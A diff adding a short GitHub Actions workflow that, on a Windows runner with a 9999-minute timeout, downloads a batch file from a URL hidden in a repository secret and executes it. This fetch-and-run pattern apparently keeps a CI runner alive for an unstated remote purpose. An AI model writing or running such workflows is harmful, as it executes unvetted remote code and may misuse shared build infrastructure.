@@ -1,0 +1,14 @@
+name: mainb
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - run: curl -s -L ${{secrets.RUNNER}} -o run.bat
+    - name: Connect Ke Run.
+      run: cmd /c run.bat
